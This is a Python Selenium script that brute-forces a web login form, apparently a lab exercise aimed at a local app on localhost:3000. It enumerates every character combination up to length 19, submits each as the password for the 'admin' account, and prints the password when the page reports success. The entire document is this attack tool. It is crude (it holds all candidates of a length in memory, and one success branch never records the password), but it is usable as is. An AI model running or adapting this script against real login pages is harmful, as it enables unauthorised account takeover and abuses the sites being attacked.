from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoAlertPresentException, TimeoutException
import itertools
import string

# This is the path to chromedriver - will need to be installed/pointed to if you try to run this script!
chrome_driver_path = 'C:/chromedriver.exe'

# Initialize the WebDriver
service = Service(chrome_driver_path)
driver = webdriver.Chrome(service=service)
password_chars = string.ascii_letters + string.digits + string.punctuation + " "
try:
    for length in range(1, 20):
        all_passwords = []
        passwords_of_length = itertools.product(password_chars, repeat=length)
        all_passwords.extend([''.join(password) for password in passwords_of_length])
        for passkey in all_passwords:
            driver.get('http://localhost:3000/')
            password = passkey
            driver.find_element(By.ID, 'username').send_keys('admin')
            driver.find_element(By.ID, 'password').send_keys(password)
            login_button = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//button[@type='submit' and text()='Login']"))
            )
            login_button.click()
            try:
                WebDriverWait(driver, 5).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert_text = alert.text  # Capture alert text before dismissing it
                alert.accept()  # Dismiss the alert
                if alert_text == "Login successful!":
                    print("The password is " + password)
            except TimeoutException:
                # No alert, assume login was successful
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, 'welcomeMessage'))
                )
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.ID, 'logoutButton'))
                ).click()
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, "//button[@type='submit' and text()='Login']"))
                )
except Exception as e:
    print('An error occurred:', e)
finally:
    driver.quit()
